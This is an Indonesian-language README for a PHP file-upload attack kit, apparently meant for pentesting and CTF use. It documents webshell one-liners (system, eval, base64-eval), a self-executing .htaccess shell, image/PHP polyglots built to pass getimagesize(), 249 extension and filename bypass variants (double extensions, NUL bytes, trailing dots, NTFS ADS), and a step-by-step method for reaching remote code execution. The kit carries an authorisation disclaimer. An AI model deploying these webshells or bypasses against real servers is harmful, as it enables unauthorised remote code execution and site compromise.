# CMD — Amunisi PHP File Upload

Koleksi payload webshell PHP multi-ekstensi untuk menguji **unrestricted file upload**.
Semua file mandiri, tidak butuh dependensi luar, dan sudah **diverifikasi eksekusi nyata**
(lihat `verify_cmd.sh` → HASIL: PASS).

> Konteks: hanya untuk pengujian yang kamu berwenang penuh (lab/CTF/scope tertulis).
> Payload di sini mengeksekusi perintah shell — jangan dipakai di sistem tanpa izin.

---

## 1. Cara pakai (titik masuk tunggal)

```bash
bash build_all.sh      # clean + build payload + build shell + verify
```

Atau terpisah:

```bash
bash clean_cmd.sh      # hapus semua artefak, sisakan sumber + skrip
bash build_cmd.sh      # generate 249 file x<ext> (core/polyglot/double/tricky)
bash build_shells.sh   # generate shell & config (htaccess/user.ini/web.config/shell-*)
bash verify_cmd.sh     # verifikasi semua: payload utuh, eksekusi PHP, deteksi gambar
```

Ganti payload default cukup dengan mengedit satu baris di `payloads.txt`, lalu build ulang.
Beberapa payload favorit:

```
<?=`$_GET[x]`?>                     # short tag + backtick (paling ringkas)
<?php system($_GET['cmd']); ?>      # klasik
<?php echo "OK";if($_POST){system($_POST['cmd']);} ?>   # POST-based
```

Semua varian `x<ext>` memakai isi `payloads.txt`, jadi teknik apapun otomatis
didistribusikan ke 249 nama file.

---

## 2. Struktur

| File | Peran |
|---|---|
| `payloads.txt` | 1 baris payload; sumber untuk semua artefak |
| `ext_core.txt` | daftar ekstensi → `x<ext>` (payload murni) |
| `ext_poly.txt` | `<ext> <MAGIC>` → `x<ext>` = header image valid + payload |
| `ext_double.txt` | nama file literal (`.php.png`, `.png.php5`, mixed-case, NTFS ADS, …) |
| `ext_trailing.txt` | nama literal + escape `\xNN` (trailing dot/NUL/newline, reserved name) |
| `imgmagic.py` | generator header image valid (PNG/GIF/JPG/BMP/WBMP/XBM/SVG/PDF) |
| `build_cmd.sh` | orkestrator 4 kategori payload |
| `build_shells.sh` | shell fungsional + konfigurasi server |
| `selfcheck.py` | uji fungsional shell via PHP CLI (menghindari quoting bash) |
| `verify_cmd.sh` | verifikasi menyeluruh, cetak PASS/FAIL |
| `clean_cmd.sh` | reset: hapus artefak, pertahankan sumber |

### Kapasitas terverifikasi

```
artefak          : 249   (x<ext>)
eksekusi PHP OK  : 249   (100%)
eksekusi GAGAL   : 0
polyglot OK      : 48    (getimagesize() benar-benar lolos)
polyglot GAGAL   : 0
shell OK         : 9
HASIL: PASS
```

---

## 3. Kategori payload

### A. Core — satu ekstensi (64 nama)

Ekstensi yang dieksekusi PHP di berbagai versi/konfigurasi server:

```
.php .php2 .php3 .php4 .php5 .php6 .php7 .php8 .php9
.phps .pht .phtm .phtml .phtml5 .phtml7 .pht5 .phtm5 .phtm7
.pgif .phar .phar5 .phpt .inc .inc5 .hphp .ctp .module .shtml
.htaccess .htpasswd .phtaccess .user.ini .ftpaccess .psgi .jst
```

Plus cadangan bila target berpindah server: `.asp .aspx .ashx .asmx .asa .cer .config
.shtm .cfm .cfc .jsp .jspx .jspf .do .action .pl .cgi .yaws .swf .rhtml .rjs .erb`.

**PHP 8 meng-execute:** `.php .php4 .php5 .phtml .module .inc .hphp .ctp`.

### B. Polyglot — gambar yang juga PHP (48 file)

Isi file = **header image valid** + payload. Melewati `getimagesize()` /
`exif_imagetype()` / `mime_content_type()` / magic-number check, dan tetap
dieksekusi bila ekstensinya dipetakan ke PHP.

Magic yang tersedia: `PNG GIF JPEG BMP WBMP XBM SVG PDF`.

```bash
x.png     # header PNG 1x1 + <?=`$_GET[x]`?>
x.jpg     # header JPEG (SOF0 lengkap) + payload
x.phtml   # header PNG + payload  -> nama PHP, isi gambar
x.png.php # header PNG + payload  -> lolos cek gambar, dieksekusi sebagai .php
```

### C. Double extension (137 nama)

Dua arah, keduanya harus dicoba:

```
x.php.png     # eksekusi di depan, ekstensi valid di belakang
x.png.php     # valid di depan, eksekusi di dalam (hacktricks step 6)
x.png.jpg.php # tiga lapis
x.png.php5 / x.jpg.phtml / x.png.phar / x.png.inc
```

Magic image otomatis mengikuti **ekstensi terakhir** (kalau `.png`/`.jpg`/`.gif`/`.pdf`).

Mixed-case untuk blacklist case-sensitive: `x.pHp.png .PHp5 .PhAr .PHTML .HtAccess .INC`.

### D. Trik nama & encoding (48 nama)

```
x.php\x20   x.php\x0a   x.php\x0d\x0a   x.php\x00   x.php\x1a   x.php\xff
x.php.      x.php..     x.php...        x.php.....
x.php/      x.php\      x.php::$data    x.asp:.jpg
x.php%00.png  x.php%0a.png  x.php%20.png  x.phpJunk123png
```

Termasuk: **trailing dot** (normalizer strip → RCE, pola CVE-2024-21546 pada
UniSharp Laravel Filemanager), **NTFS ADS** (`::$data`, Windows/IIS),
**reserved name** (`CON.php`, `NUL.php`, `COM1.php`, `LPT1.php`, `AUX.php`, `PRN.php`),
dan **path traversal** (`x.php/.png` — dicatat di log build, tidak dibuat sebagai
nama file karena `/` menandai direktori).

---

## 4. Shell & konfigurasi server

Selain 249 payload `x<ext>`:

| File | Fungsi | Cara trigger |
|---|---|---|
| `htaccess-self.php` | `.htaccess` self-contained (htshell) — file `.htaccess` sendiri jadi PHP | unggah sebagai `.htaccess`, akses `GET /.htaccess?c=id` |
| `htaccess-addtype.php` | paksa Apache execute `.png/.jpg/.gif/.txt` sebagai PHP | unggah `.htaccess`, lalu `shell.png` |
| `htaccess-phpvalue.php` | `php_value auto_prepend_file` | butuh `AllowOverride Options/All` |
| `.user.ini.php` | `auto_prepend_file` PHP-FPM/Nginx | unggah sebagai `.user.ini` di dir web |
| `web-config.php` | handler mapping IIS/ASP.NET | unggah sebagai `web.config` |
| `shell-param.php` | webshell `?c=cmd` — `system`/`passthru`/`shell_exec`/`exec`/`popen` | `GET/POST shell-param.php?c=id` |
| `shell-eval.php` | `@eval($_REQUEST['c'])` | `POST c=phpinfo();` |
| `shell-b64.php` | `eval(base64_decode())` — lewati filter kata `eval` | `POST c=<base64>` |
| `shell-upload.php` | uploader mandiri | `POST filedata=@file` |

Contoh `.htaccess` self-contained (paling andal saat `.htaccess` bisa diunggah):

```apache
<Files ~ "^\.ht">
  Require all granted
  Order allow,deny
  Allow from all
</Files>
AddType application/x-httpd-php .htaccess
<?php echo "\n"; passthru($_GET['c'].' 2>&1'); ?>
```

---

## 5. Metodologi uji upload

1. **Recon batas server.** Cek `Server:` header, apakah `phpinfo()` bocor, daftar
   ekstensi yang ditolak vs diterima.
2. **Coba core dulu** (`.php`, `.phtml`, `.php5`) — kalau lolos, selesai.
3. **Kalau ada blacklist**, uji double extension dua arah (`x.php.png` **dan**
   `x.png.php`) + mixed-case.
4. **Kalau ada validasi MIME/magic**, pakai polyglot (`x.png.php`, `x.jpg.php`)
   dengan `Content-Type: image/png` di request.
5. **Kalau ada normalisasi nama**, uji trailing dot (`x.php.`), NUL (`x.php%00.png`),
   newline (`x.php%0a`).
6. **Kalau `.htaccess`/`.user.ini`/`web.config` bisa diunggah**, langsung pakai
   kategori 4 — biasanya memberi RCE walau semua ekstensi PHP diblokir.
7. **Verifikasi eksekusi**: minta output runtime (`c=id`), jangan cuma status 200.

### Bypass Content-Type & magic number

```http
Content-Type: image/png
Content-Type: image/jpeg
Content-Type: application/octet-stream
```

Jika server juga **resize/recompress** gambar, magic-byte sederhana di atas akan
gugur. Untuk itu perlu payload yang tahan kompresi (teknik PLTE/IDAT/tEXt chunk —
lihat referensi Synacktiv di bawah).

---

## 6. Tabel ekstensi & server

| Server | Ekstensi eksekusi | Catatan |
|---|---|---|
| PHP/Apache (mod_php) | `.php .php2–.php8 .phtml .pht .phtm .phps .phar .inc .hphp .ctp .module .pgif .shtml` | `AddType`/`AddHandler` di `.htaccess` |
| PHP-FPM/Nginx | `.php` | `.user.ini` `auto_prepend_file` |
| IIS/ASP.NET | `.asp .aspx .ashx .asmx .asa .cer .config` | `web.config` handler |
| JSP/Tomcat | `.jsp .jspx .jspf .do .action` | |
| ColdFusion | `.cfm .cfml .cfc .dbm` | |
| Perl/CGI | `.pl .cgi` | |
| Apache (config) | `.htaccess` | self-contained htshell |

---

## 7. Catatan teknis (jebakan yang sudah ditembak)

Bug ini nyata dan sudah diperbaiki di skrip — penting kalau kamu menambah varian baru:

1. **Command substitution membuang byte NUL.** `M=$(printf '\x00\x00\x01\x01')`
   akan menghilangkan NUL menjadi `\x01\x01`, dan header gambar rusak. Karena itu
   semua header binary ditulis lewat `imgmagic.py` (stdout ke file), **bukan** `$(...)`.
2. **JPEG butuh SOF0 lengkap.** Cuma menempel SOI (`\xff\xd8\xff\xe0`) tidak cukup —
   `getimagesize()` balas "Unexpected end of JPEG". Struktur minimal yang lolos:
   `SOI + DQT(len 67) + SOF0(len 11, presisi 8, h, w, 1 komponen)`.
3. **BMP/WBMP gagal kalau header tidak lengkap.** BMP butuh DIB header 40 byte +
   bpp; WBMP butuh FieldValue multi-byte (`'01'`, bukan `\x01`).
4. **`printf '%b'` dua kali = no-op.** Escape `\x00` di daftar nama diterjemahkan
   sekali; jangan gandakan atau literal `\` malah hilang.
5. **NUL di nama file memecah argumen bash.** Nama seperti `x.php\x00.png` harus
   ditulis `python3`/`printf` ke file target secara langsung, bukan lewat `>` dengan
   variabel yang di-expand lagi.
6. **`php -r` lewat bash merusak quoting.** Untuk assert `echo SHELLOK;`, pakai
   `selfcheck.py` (kode uji ditulis ke file, tidak lewat shell).

---

## 8. Referensi

- HackTricks — File Upload: https://hacktricks.wiki/en/pentesting-web/file-upload/
- PayloadsAllTheThings — Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- htshells (Wireghoul): https://github.com/wireghoul/htshells
- Noredo — wordlist bypass ekstensi: https://github.com/Noredo/Wordlist-file-upload-extension-bypass
- Synacktiv — persistent PHP payload di PNG (PLTE/IDAT/tEXt): https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
- Upload Bypass (sAjibuu): https://github.com/sAjibuu/Upload_Bypass
